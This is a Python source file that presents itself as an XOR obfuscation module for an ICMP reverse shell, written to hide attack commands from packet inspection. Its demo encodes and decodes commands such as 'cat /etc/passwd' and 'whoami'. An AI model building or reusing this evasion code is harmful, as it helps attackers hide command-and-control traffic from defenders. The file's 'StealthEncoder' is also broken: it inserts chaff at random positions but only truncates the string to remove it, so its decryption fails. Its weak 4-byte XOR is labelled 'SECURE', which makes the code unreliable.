#!/usr/bin/env python3
"""
XOR Encryption Module for ICMP Reverse Shell
Hides command payloads from basic packet inspection
"""

import base64
import random

class XOREncoder:
    def __init__(self, key=None):
        """Initialize with optional custom key"""
        if key:
            self.key = key.encode('utf-8')
        else:
            # Generate random 4-byte key if none provided
            self.key = self.generate_key()
    
    def generate_key(self, length=4):
        """Generate random encryption key"""
        key_bytes = bytes([random.randint(0, 255) for _ in range(length)])
        print(f"[+] Generated key: {key_bytes.hex()}")
        return key_bytes
    
    def set_key(self, key_hex):
        """Set key from hex string"""
        self.key = bytes.fromhex(key_hex)
        print(f"[+] Key set to: {self.key.hex()}")
    
    def get_key_hex(self):
        """Get key as hex string for sharing"""
        return self.key.hex()
    
    def xor_encrypt(self, plaintext):
        """XOR encrypt a string"""
        if isinstance(plaintext, str):
            plaintext = plaintext.encode('utf-8')
        
        ciphertext = bytearray()
        key_len = len(self.key)
        
        for i, byte in enumerate(plaintext):
            ciphertext.append(byte ^ self.key[i % key_len])
        
        # Return as base64 for safe transmission
        return base64.b64encode(ciphertext).decode('ascii')
    
    def xor_decrypt(self, ciphertext_b64):
        """XOR decrypt a base64 encoded string"""
        try:
            ciphertext = base64.b64decode(ciphertext_b64)
            plaintext = bytearray()
            key_len = len(self.key)
            
            for i, byte in enumerate(ciphertext):
                plaintext.append(byte ^ self.key[i % key_len])
            
            return plaintext.decode('utf-8', errors='ignore')
        except Exception as e:
            print(f"[-] Decryption error: {e}")
            return None
    
    def obfuscate_command(self, command):
        """Wrap command with XOR encryption"""
        encrypted = self.xor_encrypt(command)
        return f"XOR:{encrypted}"
    
    def deobfuscate_command(self, encrypted_msg):
        """Extract and decrypt XOR command"""
        if encrypted_msg.startswith("XOR:"):
            encrypted_data = encrypted_msg[4:]
            return self.xor_decrypt(encrypted_data)
        return encrypted_msg  # Plaintext fallback


class StealthEncoder(XOREncoder):
    """Enhanced encoder with additional obfuscation layers"""
    
    def __init__(self, key=None):
        super().__init__(key)
        self.chaff_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
    
    def add_chaff(self, data, ratio=0.3):
        """Add random noise to payload"""
        if len(data) < 10:
            return data
        
        result = list(data)
        for _ in range(int(len(data) * ratio)):
            pos = random.randint(0, len(result))
            result.insert(pos, random.choice(self.chaff_chars))
        
        return ''.join(result)
    
    def remove_chaff(self, data, original_length):
        """Remove chaff based on original length (simplified)"""
        # This is simplified - real implementation would need chaff markers
        return data[:original_length]
    
    def super_encrypt(self, plaintext):
        """XOR + chaff + base64"""
        encrypted = self.xor_encrypt(plaintext)
        chaffed = self.add_chaff(encrypted)
        return f"SECURE:{chaffed}"
    
    def super_decrypt(self, ciphertext):
        """Reverse the super encryption"""
        if ciphertext.startswith("SECURE:"):
            chaffed = ciphertext[7:]
            # Estimate original length (simplified)
            encrypted = self.remove_chaff(chaffed, len(chaffed) - int(len(chaffed) * 0.23))
            return self.xor_decrypt(encrypted)
        return ciphertext


# Simple test/demo
def demo():
    print("="*50)
    print("XOR Encoder Demo")
    print("="*50)
    
    # Create encoder
    encoder = XOREncoder()
    print(f"\n[+] Key: {encoder.get_key_hex()}")
    
    # Test commands
    test_commands = [
        "whoami",
        "ls -la /tmp",
        "cat /etc/passwd",
        "powershell Get-Process",
        "dir C:\\Users"
    ]
    
    for cmd in test_commands:
        print(f"\n[*] Original: {cmd}")
        
        # Encrypt
        encrypted = encoder.obfuscate_command(cmd)
        print(f"[+] Encrypted: {encrypted[:50]}...")
        
        # Decrypt
        decrypted = encoder.deobfuscate_command(encrypted)
        print(f"[+] Decrypted: {decrypted}")
        
        assert cmd == decrypted, "Encryption failed!"
    
    print("\n" + "="*50)
    print("[✓] All tests passed!")
    print("="*50)
    
    # Demo stealth encoder
    print("\n[*] Stealth Encoder Demo:")
    stealth = StealthEncoder()
    original = "whoami"
    encrypted = stealth.super_encrypt(original)
    decrypted = stealth.super_decrypt(encrypted)
    print(f"  Original: {original}")
    print(f"  Encrypted: {encrypted[:60]}...")
    print(f"  Decrypted: {decrypted}")


if __name__ == "__main__":
    demo()